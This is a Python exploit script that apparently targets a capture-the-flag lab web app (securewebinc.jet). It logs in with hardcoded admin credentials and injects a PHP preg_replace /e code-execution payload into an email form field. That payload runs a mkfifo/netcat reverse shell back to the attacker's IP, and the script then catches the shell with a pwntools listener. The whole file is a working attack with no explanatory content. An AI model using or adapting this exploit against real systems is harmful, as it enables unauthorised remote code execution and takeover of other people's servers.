#!/usr/bin/python3
import requests
from pwn import *

with open("/etc/hosts", "a") as file:
    file.write("10.13.37.10 www.securewebinc.jet")

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

def cmd():
    url = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/"
    sess = requests.Session()
    cred = { "username": "admin", "password": "Hackthesystem200" }
    data = { "swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {sys.argv[1]} 443 >/tmp/f')", "to": "gato@gato.com", "subject": "gato", "message": "fuck", "_wysihtml5_mode": 1 }
    sess.post(url + '/dologin.php', data=cred, verify=False)
    sess.post(url + '/email.php', data=data, verify=False)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=60).wait_for_connection()
shell.sendline(b"export HOME=/var/www TERM=xterm")
shell.interactive()
